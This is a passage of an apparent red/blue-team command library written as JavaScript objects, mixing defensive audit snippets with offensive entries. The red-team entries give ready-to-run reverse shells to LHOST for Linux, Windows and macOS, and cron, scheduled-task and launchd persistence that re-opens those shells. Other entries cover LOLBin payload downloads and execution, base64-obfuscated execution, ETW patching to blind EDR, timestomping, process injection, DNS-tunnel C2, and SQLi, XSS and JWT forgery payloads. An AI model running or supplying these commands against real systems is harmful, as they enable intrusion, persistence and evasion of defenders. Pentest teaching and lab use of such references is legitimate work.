      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'ips', owasp: [] },
    { id: 'misp-feed-sync', title: 'MISP Feed Sync', team: 'blue', category: 'threatintel',
      description: 'Sync external threat feeds into MISP.',
      tags: ['misp', 'feeds', 'sync'], command: 'curl -XPOST "$MISP_URL/feeds/fetchFromAllFeeds" -H "Authorization: $MISP_KEY" -H "Content-Type: application/json"',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },

    // ═══════════════════════════════════════════════════════
    //  BLUE-SIDE COUNTERPARTS — password policy, API defense, wireless defense
    // ═══════════════════════════════════════════════════════
    { id: 'blue-password-policy', title: 'Password Policy Audit', team: 'blue', category: 'passwords',
      description: 'Check Windows domain and Linux password policies.',
      tags: ['password', 'policy', 'audit'],
      commands: {
        linux: 'cat /etc/login.defs | grep -E "PASS_MAX|PASS_MIN|PASS_WARN"\ncat /etc/pam.d/common-password | grep pam_pwquality\nchage -l root',
        windows: 'net accounts\nGet-ADDefaultDomainPasswordPolicy\nGet-ADFineGrainedPasswordPolicy -Filter *',
      },
      command: '# Linux: cat /etc/login.defs | grep PASS\n# Windows: net accounts && Get-ADDefaultDomainPasswordPolicy',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'tools', owasp: ['A07'] },
    { id: 'blue-breach-check', title: 'Credential Breach Check', team: 'blue', category: 'passwords',
      description: 'Check if organizational emails appear in breaches (HIBP).',
      tags: ['hibp', 'breach', 'email'], command: 'curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/USER@DOMAIN" -H "hibp-api-key: $HIBP_KEY" -H "user-agent: Toolbelt" | jq .',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'domains', owasp: ['A07'] },
    { id: 'blue-api-rate-limit', title: 'API Rate Limit Test', team: 'blue', category: 'api',
      description: 'Verify API rate limiting is working correctly.',
      tags: ['api', 'rate-limit', 'defense'], command: 'for i in $(seq 1 50); do curl -s -o /dev/null -w "%{http_code} " https://TARGET/api/endpoint; done | sort | uniq -c\n# Should see 429s after limit hit',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: ['A04'] },
    { id: 'blue-api-auth-test', title: 'API Auth Verification', team: 'blue', category: 'api',
      description: 'Verify API authentication and authorization controls.',
      tags: ['api', 'auth', 'defense'], command: '# No token (should 401):\ncurl -s -o /dev/null -w "%{http_code}" https://TARGET/api/protected\n# Wrong role (should 403):\ncurl -s -o /dev/null -w "%{http_code}" https://TARGET/api/admin -H "Authorization: Bearer $USER_TOKEN"\n# Expired token:\ncurl -s -o /dev/null -w "%{http_code}" https://TARGET/api/protected -H "Authorization: Bearer $EXPIRED_TOKEN"',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: ['A01', 'A07'] },
    { id: 'blue-api-input-fuzz', title: 'API Input Validation Test', team: 'blue', category: 'api',
      description: 'Test API input validation with m_alicious payloads.',
      tags: ['api', 'fuzzing', 'validation'], command: '# SQL injection test:\ncurl -s https://TARGET/api/users?id=1\' OR 1=1--\n# XSS test:\ncurl -s -X POST https://TARGET/api/comments -d \'{"text":"<script>alert(1)</script>"}\'\n# Path traversal:\ncurl -s https://TARGET/api/files?name=../../etc_passwd',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'tools', owasp: ['A03'] },
    { id: 'blue-wireless-scan', title: 'Wireless Security Audit', team: 'blue', category: 'wireless',
      description: 'Audit WiFi security — detect rogue APs, weak encryption.',
      tags: ['wifi', 'audit', 'wireless'], command: '# List networks with security info:\nnmcli dev wifi list\n# Check for WEP (insecure):\nairodump-ng wlan0 --band abg | grep WEP\n# Kismet passive scan:\nkismet -c wlan0',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: [] },
    { id: 'blue-wireless-ids', title: 'Wireless IDS (Kismet)', team: 'blue', category: 'wireless',
      description: 'Deploy Kismet as wireless intrusion detection system.',
      tags: ['kismet', 'wids', 'wireless'], command: 'kismet -c wlan0 --override wardrive\n# Alert on deauth floods:\n# kismet.conf: alert=DEAUTHFLOOD\n# Web UI: http://localhost:2501',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },

    // ═══════════════════════════════════════════════════════
    //  EVASION / BYPASS
    // ═══════════════════════════════════════════════════════
    { id: 'ev-base64-payload', title: 'Base64 Payload Obfuscation', team: 'red', category: 'evasion',
      description: 'Encode payload in Base64 to bypass simple AV signatures.',
      tags: ['base64', 'obfuscation', 'evasion'], command: '# Linux — encode + exec:\necho "bash -i >& /dev/tcp/LHOST/LPORT 0>&1" | base64\necho "ENCODED_STRING" | base64 -d | bash\n# Windows:\npowershell -enc [BASE64_UTF16LE_PAYLOAD]',
      killchain: 'delivery', attack: ['defense-evasion', 'execution'], pyramid: 'ttps', owasp: [] },
    { id: 'ev-donut-shellcode', title: 'Donut Shellcode Generator', team: 'red', category: 'evasion',
      description: 'Convert .NET/PE to position-independent shellcode.',
      tags: ['donut', 'shellcode', 'evasion'], command: '# Generate shellcode from .NET assembly:\npython3 -c "import donut; shellcode = donut.create(file=\'payload.exe\', arch=2)"\n# Or CLI:\ndonut -f payload.exe -a 2 -o payload.bin',
      killchain: 'weaponize', attack: ['defense-evasion'], pyramid: 'ttps', owasp: [] },
    { id: 'ev-traffic-encrypt', title: 'C2 Traffic Encryption', team: 'red', category: 'evasion',
      description: 'Encrypt C2 traffic via DNS-over-HTTPS or domain fronting.',
      tags: ['c2', 'encryption', 'dns'], command: '# DNS tunneling with iodine:\niodined -c -P password 10.0.0.1 tunnel.DOMAIN\niodine -P password tunnel.DOMAIN\n# Or dnscat2 encrypted:\ndnscat2 --dns "domain=tunnel.DOMAIN" --secret=KEY',
      killchain: 'c2', attack: ['command-control', 'defense-evasion'], pyramid: 'ttps', owasp: [] },
    { id: 'ev-timestomp', title: 'Timestomping', team: 'red', category: 'evasion',
      description: 'Modify file timestamps to blend in with legitimate files.',
      tags: ['timestomp', 'anti-forensics', 'evasion'], command: '# Linux — match timestamp of another file:\ntouch -r /bin/ls /tmp/payload\n# Windows PowerShell:\n$(Get-Item payload.exe).LastWriteTime = "01/01/2023 08:00:00"',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'artifacts', owasp: [] },
    { id: 'ev-process-inject', title: 'Process Injection (Linux)', team: 'red', category: 'evasion',
      description: 'Inject into running process memory to avoid file-based detection.',
      tags: ['injection', 'process', 'evasion'], command: '# Python process injection via /proc/pid/mem:\npython3 -c "import ctypes; libc = ctypes.CDLL(None); libc.ptrace(16, PID, 0, 0)"\n# Or load shared lib:\nLD_PRELOAD=/tmp/evil.so /usr/bin/target',
      killchain: 'exploitation', attack: ['defense-evasion', 'execution'], pyramid: 'ttps', owasp: [] },
    { id: 'ev-living-off-land', title: 'LOLBins (Living Off The Land)', team: 'red', category: 'evasion',
      description: 'Use legitimate OS binaries for m_alicious purposes — no extra tools.',
      tags: ['lolbins', 'lotl', 'evasion'],
      commands: {
        linux: '# Download via curl/wget (already present):\ncurl https://LHOST/payload -o /tmp/p\n# Exec via python:\npython3 -c "import os; os.system(\'/tmp/p\')"\n# Tunnel via ssh:\nssh -D 1080 user@PIVOT',
        windows: '# Download via certutil:\ncertutil -urlcache -split -f https://LHOST/payload.exe %TEMP%\\p.exe\n# Exec via mshta:\nmshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -f %TEMP%\\p.ps1"":close")\n# Download via bitsadmin:\nbitsadmin /transfer job https://LHOST/payload.exe %TEMP%\\p.exe',
      },
      command: '# Linux: curl + python exec\n# Windows: certutil, mshta, bitsadmin\n# Select OS above for commands',
      killchain: 'delivery', attack: ['defense-evasion', 'execution'], pyramid: 'ttps', owasp: [] },
    { id: 'ev-etw-patch', title: 'ETW Patching (Windows)', team: 'red', category: 'evasion',
      description: 'Patch Event Tracing for Windows to blind EDR telemetry.',
      tags: ['etw', 'windows', 'edr', 'evasion'], command: '# PowerShell — patch EtwEventWrite:\n$patch = [byte[]] (0xc3) # ret\n$ntdll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.Diagnostics.Eventing.EventProvider].Module)\n# Use reflective loading to patch in-memory',
      killchain: 'exploitation', attack: ['defense-evasion'], pyramid: 'ttps', owasp: [], os: 'windows' },
    { id: 'ev-packed-payload', title: 'UPX Packing', team: 'red', category: 'evasion',
      description: 'Pack executables with UPX to change signature.',
      tags: ['upx', 'packing', 'evasion'], command: '# Pack:\nupx --best -o packed.exe payload.exe\n# Unpack (for analysis):\nupx -d packed.exe -o unpacked.exe',
      killchain: 'weaponize', attack: ['defense-evasion'], pyramid: 'artifacts', owasp: [] },

    // ═══════════════════════════════════════════════════════
    //  CRYPTOGRAPHY / ENCODING UTILITIES
    // ═══════════════════════════════════════════════════════
    { id: 'crypto-hash', title: 'File Hash (MD5/SHA)', team: 'blue', category: 'crypto',
      description: 'Calculate file hashes for integrity verification.',
      tags: ['hash', 'md5', 'sha256', 'integrity'],
      commands: {
        linux: 'md5sum file.txt\nsha256sum file.txt\nsha1sum file.txt',
        windows: 'Get-FileHash file.txt -Algorithm SHA256\ncertutil -hashfile file.txt SHA256',
        macos: 'md5 file.txt\nshasum -a 256 file.txt',
      },
      command: '# Linux: sha256sum file.txt\n# Windows: Get-FileHash file.txt\n# macOS: shasum -a 256 file.txt',
      killchain: 'actions', attack: ['collection'], pyramid: 'hashes', owasp: [] },
    { id: 'crypto-base64', title: 'Base64 Encode/Decode', team: 'red', category: 'crypto',
      description: 'Encode and decode Base64 strings.',
      tags: ['base64', 'encoding'],
      commands: {
        linux: 'echo "data" | base64\necho "ZGF0YQ==" | base64 -d\nbase64 -w0 file.txt > encoded.txt',
        windows: '[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("data"))\n[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("ZGF0YQ=="))',
        macos: 'echo "data" | base64\necho "ZGF0YQ==" | base64 -D',
      },
      command: '# Encode: echo "data" | base64\n# Decode: echo "ZGF0YQ==" | base64 -d',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'artifacts', owasp: [] },
    { id: 'crypto-ssl-cert', title: 'Self-Signed SSL Certificate', team: 'red', category: 'crypto',
      description: 'Generate self-signed TLS certificate for C2/phishing.',
      tags: ['openssl', 'certificate', 'tls'], command: 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=DOMAIN"\n# View cert:\nopenssl x509 -in cert.pem -text -noout',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'artifacts', owasp: [] },
    { id: 'crypto-ssl-test', title: 'SSL/TLS Security Test', team: 'blue', category: 'crypto',
      description: 'Test server TLS configuration for weaknesses.',
      tags: ['openssl', 'tls', 'audit'], command: '# Check TLS versions:\nopenssl s_client -connect TARGET:443 -tls1\nopenssl s_client -connect TARGET:443 -tls1_2\n# Check cipher suites:\nnmap --script ssl-enum-ciphers -p 443 TARGET\n# Or testssl.sh:\ntestssl.sh TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A02'] },
    { id: 'crypto-gpg-encrypt', title: 'GPG Encrypt/Decrypt', team: 'blue', category: 'crypto',
      description: 'Encrypt/decrypt files with GPG for secure transfer.',
      tags: ['gpg', 'encryption', 'pgp'], command: '# Symmetric encryption:\ngpg -c --cipher-algo AES256 sensitive.txt\n# Decrypt:\ngpg -d sensitive.txt.gpg > sensitive.txt\n# Asymmetric — encrypt for recipient:\ngpg -e -r recipient@email.com sensitive.txt',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },
    { id: 'crypto-jwt-decode', title: 'JWT Decode & Inspect', team: 'red', category: 'crypto',
      description: 'Decode JWT token to inspect claims without verification.',
      tags: ['jwt', 'token', 'decode'], command: '# Decode header:\necho "JWT_TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq .\n# Decode payload:\necho "JWT_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .\n# Or python:\npython3 -c "import jwt; print(jwt.decode(\'TOKEN\', options={\'verify_signature\': False}))"',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'artifacts', owasp: ['A07'] },
    { id: 'crypto-password-gen', title: 'Secure Password Generation', team: 'blue', category: 'crypto',
      description: 'Generate cryptographically secure passwords.',
      tags: ['password', 'random', 'generation'],
      commands: {
        linux: 'openssl rand -base64 32\n# Or:\npython3 -c "import secrets; print(secrets.token_urlsafe(32))"',
        windows: '[System.Web.Security.Membership]::GeneratePassword(32,8)\n# Or:\npython3 -c "import secrets; print(secrets.token_urlsafe(32))"',
        macos: 'openssl rand -base64 32',
      },
      command: '# openssl rand -base64 32\n# python3 -c "import secrets; print(secrets.token_urlsafe(32))"',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: ['A07'] },
    { id: 'crypto-hash-crack-id', title: 'Hash Type Identifier', team: 'red', category: 'crypto',
      description: 'Identify hash type before cracking.',
      tags: ['hash', 'identify', 'hashcat'], command: '# hashid:\nhashid "5f4dcc3b5aa765d61d8327deb882cf99"\n# Or hashcat example hashes:\nhashcat --example-hashes | grep -A2 -B2 "5f4dcc"\n# Or online: https://hashes.com/en/tools/hash_identifier',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'hashes', owasp: ['A02'] },

    // ═══════════════════════════════════════════════════════
    //  OS-VARIANT SNIPPETS — multi-OS with commands object
    // ═══════════════════════════════════════════════════════
    { id: 'download-file', title: 'File Download (Multi-OS)', team: 'red', category: 'transfer',
      description: 'Download a file from attacker server — OS-specific variants.',
      tags: ['wget', 'curl', 'powershell', 'transfer'],
      commands: {
        linux: 'wget https://LHOST:8000/payload -O /tmp/payload\ncurl -o /tmp/payload https://LHOST:8000/payload',
        windows: 'certutil -urlcache -split -f https://LHOST:8000/payload.exe C:\\Windows\\Temp\\payload.exe\npowershell -c "IWR -Uri https://LHOST:8000/payload.exe -OutFile C:\\Windows\\Temp\\payload.exe"',
        macos: 'curl -o /tmp/payload https://LHOST:8000/payload',
      },
      command: '# Linux:\nwget https://LHOST:8000/payload -O /tmp/payload\n# Windows:\ncertutil -urlcache -split -f https://LHOST:8000/payload.exe C:\\Windows\\Temp\\payload.exe\n# macOS:\ncurl -o /tmp/payload https://LHOST:8000/payload',
      killchain: 'delivery', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'reverse-shell-multi', title: 'Reverse Shell (Multi-OS)', team: 'red', category: 'shells',
      description: 'Reverse shell — auto-selects OS-appropriate variant.',
      tags: ['reverse-shell', 'multi-os'],
      commands: {
        linux: 'bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"',
        windows: '$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
        macos: 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")\'',
      },
      command: '# Linux:\nbash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"\n# Windows:\npowershell -nop -c "$client = New-Object Net.Sockets.TCPClient(\'LHOST\',LPORT)..."\n# macOS:\npython3 -c \'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));...\'',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'ttps', owasp: [] },
    { id: 'persist-multi', title: 'Persistence (Multi-OS)', team: 'red', category: 'persist',
      description: 'Install persistence mechanism — auto-selects OS variant.',
      tags: ['persistence', 'multi-os'],
      commands: {
        linux: '(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'") | crontab -',
        windows: 'schtasks /create /sc MINUTE /mo 5 /tn "WindowsUpdate" /tr "powershell -ep bypass -w hidden -c IEX(IWR https://LHOST/shell.ps1)" /ru SYSTEM',
        macos: 'cat <<EOF > ~/Library/LaunchAgents/com.update.plist\n<?xml version="1.0"?>\n<plist version="1.0"><dict>\n<key>Label</key><string>com.update</string>\n<key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>bash -i >& /dev/tcp/LHOST/LPORT 0>&1</string></array>\n<key>StartInterval</key><integer>300</integer>\n</dict></plist>\nEOF\nlaunchctl load ~/Library/LaunchAgents/com.update.plist',
      },
      command: '# Linux: crontab\n# Windows: schtasks\n# macOS: launchd plist\n# Select OS above for specific command',
      killchain: 'installation', attack: ['persistence'], pyramid: 'ttps', owasp: [] },
    { id: 'enum-network-multi', title: 'Network Enum (Multi-OS)', team: 'red', category: 'enum',
      description: 'List open ports and active connections — OS-specific.',
      tags: ['network', 'enum', 'multi-os'],
      commands: {
        linux: 'ss -tulpen\nlsof -i -P -n | grep ESTABLISHED\nip a\nip route',
        windows: 'netstat -ano\nipconfig /all\nroute print\narp -a',
        macos: 'lsof -i -P -n | grep ESTABLISHED\nnetstat -an\nifconfig\nnetstat -rn',
      },
      command: '# Linux: ss -tulpen\n# Windows: netstat -ano\n# macOS: lsof -i -P -n\n# Select OS above for full command',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'enum-users-multi', title: 'User Enumeration (Multi-OS)', team: 'red', category: 'enum',
      description: 'List users and groups — OS-specific.',
      tags: ['users', 'enum', 'multi-os'],
      commands: {
        linux: 'cat /etc_passwd\ngetent group sudo\nwho\nlast -10',
        windows: 'net user\nnet localgroup administrators\nquery user\nwhoami /all',
        macos: 'dscl . list /Users\ndscl . read /Groups/admin GroupMembership\nwho\nlast -10',
      },
      command: '# Linux: cat /etc_passwd\n# Windows: net user\n# macOS: dscl . list /Users\n# Select OS above for full command',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'sysinfo-multi', title: 'System Info (Multi-OS)', team: 'red', category: 'enum',
      description: 'Gather OS, hostname, kernel, architecture info.',
      tags: ['sysinfo', 'enum', 'multi-os'],
      commands: {
        linux: 'uname -a\nhostname\ncat /etc/os-release\narch\nid',
        windows: 'systeminfo\nhostname\nwhoami /all',
        macos: 'uname -a\nhostname\nsw_vers\nsysctl -a | grep machdep.cpu',
      },
      command: '# Linux: uname -a && cat /etc/os-release\n# Windows: systeminfo\n# macOS: sw_vers',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'firewall-check-multi', title: 'Firewall Check (Multi-OS)', team: 'blue', category: 'defense',
      description: 'Check firewall status and rules on any OS.',
      tags: ['firewall', 'defense', 'multi-os'],
      commands: {
        linux: 'iptables -L -n -v\nufw status verbose\nnft list ruleset',
        windows: 'netsh advfirewall show allprofiles\nGet-NetFirewallRule | Where-Object {$_.Enabled -eq "True"} | Format-Table DisplayName,Direction,Action',
        macos: '/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\npfctl -sr',
      },
      command: '# Linux: iptables -L -n -v\n# Windows: netsh advfirewall show allprofiles\n# macOS: pfctl -sr',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'service-enum-multi', title: 'Service Enumeration (Multi-OS)', team: 'red', category: 'enum',
      description: 'List running services — OS-specific.',
      tags: ['services', 'enum', 'multi-os'],
      commands: {
        linux: 'systemctl list-units --type=service --state=running\nps aux --sort=-%mem | head -20',
        windows: 'Get-Service | Where-Object {$_.Status -eq "Running"}\nwmic service list brief',
        macos: 'launchctl list | grep -v "com.apple"\nps aux --sort=-%mem | head -20',
      },
      command: '# Linux: systemctl list-units --type=service\n# Windows: Get-Service | running\n# macOS: launchctl list',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'scheduled-tasks-multi', title: 'Scheduled Tasks (Multi-OS)', team: 'red', category: 'enum',
      description: 'Enumerate scheduled tasks for persistence hunting.',
      tags: ['cron', 'schtasks', 'launchd', 'multi-os'],
      commands: {
        linux: 'crontab -l\nls -la /etc/cron.*\nfor user in $(cut -f1 -d: /etc_passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done',
        windows: 'schtasks /query /fo TABLE /v | findstr /v "Microsoft"\nGet-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Format-Table TaskName,State',
        macos: 'launchctl list\nls ~/Library/LaunchAgents/ /Library/LaunchAgents/ /Library/LaunchDaemons/',
      },
      command: '# Linux: crontab -l && ls /etc/cron.*\n# Windows: schtasks /query\n# macOS: launchctl list',
      killchain: 'recon', attack: ['discovery', 'persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'log-collection-multi', title: 'Log Collection (Multi-OS)', team: 'blue', category: 'ir',
      description: 'Collect system logs for incident investigation.',
      tags: ['logs', 'ir', 'multi-os'],
      commands: {
        linux: 'journalctl --since "24 hours ago" --no-pager > /tmp/journal.txt\ncat /var/log/auth.log > /tmp/auth.txt\ncat /var/log/syslog > /tmp/syslog.txt',
        windows: 'wevtutil epl Security C:\\IR\\security.evtx\nwevtutil epl System C:\\IR\\system.evtx\nwevtutil epl Application C:\\IR\\application.evtx',
        macos: 'log show --predicate "eventType == logEvent" --last 24h > /tmp/unified.log\nlog show --predicate "processImagePath CONTAINS \\"sshd\\"" --last 24h',
      },
      command: '# Linux: journalctl + /var/log/\n# Windows: wevtutil epl\n# macOS: log show',
      killchain: 'actions', attack: ['collection'], pyramid: 'artifacts', owasp: [] },

    // ── Mobile Pentesting ──────────────────────────────────
    { id: 'adb-devices', title: 'ADB Device List', team: 'red', category: 'mobile',
      description: 'List connected Android devices.',
      tags: ['adb', 'android', 'mobile'], command: 'adb devices -l',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: [] },
    { id: 'adb-shell', title: 'ADB Shell', team: 'red', category: 'mobile',
      description: 'Open interactive shell on Android device.',
      tags: ['adb', 'android', 'mobile'], command: 'adb shell',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'tools', owasp: [] },
    { id: 'apk-decompile', title: 'APK Decompile (apktool)', team: 'red', category: 'mobile',
      description: 'Decompile APK to smali + resources for analysis.',
      tags: ['apktool', 'android', 'reverse'], command: 'apktool d target.apk -o decompiled/',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A04'] },
    { id: 'jadx-decompile', title: 'JADX Java Decompile', team: 'red', category: 'mobile',
      description: 'Decompile APK to readable Java source code.',
      tags: ['jadx', 'android', 'reverse'], command: 'jadx -d jadx_output/ target.apk',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A04'] },
    { id: 'frida-enumerate', title: 'Frida App Enumerate', team: 'red', category: 'mobile',
      description: 'List running apps and processes via Frida dynamic instrumentation.',
      tags: ['frida', 'mobile', 'hooking'], command: 'frida-ps -Uai',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'frida-bypass-ssl', title: 'Frida SSL Pin Bypass', team: 'red', category: 'mobile',
      description: 'Bypass SSL certificate pinning with Frida script.',
      tags: ['frida', 'mobile', 'ssl'], command: 'frida -U -f com.target.app -l ssl_bypass.js --no-pause',
      killchain: 'exploitation', attack: ['defense-evasion'], pyramid: 'ttps', owasp: ['A02'] },
    { id: 'objection-explore', title: 'Objection Explore', team: 'red', category: 'mobile',
      description: 'Runtime mobile security assessment with objection.',
      tags: ['objection', 'mobile', 'frida'], command: 'objection -g com.target.app explore',
      killchain: 'exploitation', attack: ['discovery', 'defense-evasion'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'mobsf-scan', title: 'MobSF Static Analysis', team: 'blue', category: 'mobile',
      description: 'Mobile Security Framework — automated static analysis of APK/IPA.',
      tags: ['mobsf', 'mobile', 'sast'], command: 'docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A04', 'A06'] },

    // ── API Testing ────────────────────────────────────────
    { id: 'api-jwt-decode', title: 'JWT Decode', team: 'red', category: 'api',
      description: 'Decode JWT token without verification to inspect claims.',
      tags: ['jwt', 'api', 'auth'], command: 'echo "TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: ['A02', 'A07'] },
    { id: 'api-jwt-none', title: 'JWT "none" Algorithm Attack', team: 'red', category: 'api',
      description: 'Test if API accepts JWT with alg:none (no signature verification).',
      tags: ['jwt', 'api', 'auth'], command: '# Craft alg:none JWT:\npython3 -c "\nimport base64, json\nheader = base64.urlsafe_b64encode(json.dumps({\'alg\':\'none\',\'typ\':\'JWT\'}).encode()).rstrip(b\'=\')\npayload = base64.urlsafe_b64encode(json.dumps({\'sub\':\'admin\',\'role\':\'admin\'}).encode()).rstrip(b\'=\')\nprint(header.decode() + \'.\' + payload.decode() + \'.\')\n"',
      killchain: 'exploitation', attack: ['defense-evasion', 'credential-access'], pyramid: 'ttps', owasp: ['A02', 'A07'] },
    { id: 'api-bola', title: 'BOLA / IDOR Test', team: 'red', category: 'api',
      description: 'Test for Broken Object Level Authorization — access other users resources.',
      tags: ['api', 'idor', 'bola'], command: '# As user A, note resource ID:\ncurl -s -H "Authorization: Bearer TOKEN_A" https://TARGET/api/users/1/profile\n# Try with user B token:\ncurl -s -H "Authorization: Bearer TOKEN_B" https://TARGET/api/users/1/profile',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'api-mass-assignment', title: 'Mass Assignment Test', team: 'red', category: 'api',
      description: 'Test if API accepts unintended fields (role, admin, isVerified).',
      tags: ['api', 'mass-assignment'], command: 'curl -X PUT https://TARGET/api/users/me \\\n  -H "Authorization: Bearer TOKEN" \\\n  -H "Content-Type: application/json" \\\n  -d \'{"name":"test","role":"admin","isAdmin":true,"verified":true}\'',
      killchain: 'exploitation', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01', 'A04'] },
    { id: 'api-rate-limit', title: 'Rate Limit Test', team: 'red', category: 'api',
      description: 'Test API rate limiting by rapid-fire requests.',
      tags: ['api', 'rate-limit'], command: 'for i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}" https://TARGET/api/login -d \'{"user":"admin","pass":"test"}\'; echo; done | sort | uniq -c',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'api-graphql-introspect', title: 'GraphQL Introspection', team: 'red', category: 'api',
      description: 'Dump the full GraphQL schema via introspection query.',
      tags: ['graphql', 'api', 'introspection'], command: 'curl -s https://TARGET/graphql -H "Content-Type: application/json" -d \'{"query":"{ __schema { types { name fields { name type { name } } } } }"}\'  | python3 -m json.tool',
      killchain: 'recon', attack: ['reconnaissance', 'discovery'], pyramid: 'artifacts', owasp: ['A01', 'A05'] },
    { id: 'api-swagger-enum', title: 'Swagger/OpenAPI Enum', team: 'red', category: 'api',
      description: 'Enumerate API endpoints from publicly accessible docs.',
      tags: ['api', 'swagger', 'openapi'], command: '# Common OpenAPI doc paths:\ncurl -s https://TARGET/swagger.json | python3 -m json.tool\ncurl -s https://TARGET/api-docs\ncurl -s https://TARGET/v2/api-docs\ncurl -s https://TARGET/openapi.json',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'artifacts', owasp: ['A05'] },
    { id: 'api-postman-collection', title: 'Postman Collection Import', team: 'red', category: 'api',
      description: 'Convert Postman collection to curl commands for testing.',
      tags: ['postman', 'api'], command: 'npx postman-to-curl collection.json',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: [] },

    // ── Container Defense / Hardening ──────────────────────
    { id: 'docker-bench', title: 'Docker Bench Security', team: 'blue', category: 'container-defense',
      description: 'CIS Docker Benchmark automated audit.',
      tags: ['docker', 'cis', 'hardening'], command: 'docker run --rm --net host --pid host --userns host --cap-add audit_control \\\n  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \\\n  -v /var/lib:/var/lib:ro -v /var/run/docker.sock:/var/run/docker.sock:ro \\\n  -v /etc:/etc:ro -v /usr/lib/systemd:/usr/lib/systemd:ro \\\n  docker/docker-bench-security',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'trivy-image', title: 'Trivy Image Scan', team: 'blue', category: 'container-defense',
      description: 'Scan a Docker image for CVEs, secrets, and misconfigurations.',
      tags: ['trivy', 'docker', 'vuln-scan'], command: 'trivy image --severity HIGH,CRITICAL --format table TARGET_IMAGE:latest',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'grype-scan', title: 'Grype Vulnerability Scan', team: 'blue', category: 'container-defense',
      description: 'Fast vulnerability scanner for container images and filesystems.',
      tags: ['grype', 'docker', 'vuln-scan'], command: 'grype TARGET_IMAGE:latest --only-fixed --fail-on high',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'falco-runtime', title: 'Falco Runtime Security', team: 'blue', category: 'container-defense',
      description: 'Cloud-native runtime security — detect abnormal container behavior.',
      tags: ['falco', 'runtime', 'detection'], command: 'docker run --rm -i -t \\\n  --privileged \\\n  -v /var/run/docker.sock:/host/var/run/docker.sock \\\n  -v /proc:/host/proc:ro \\\n  falcosecurity/falco:latest',
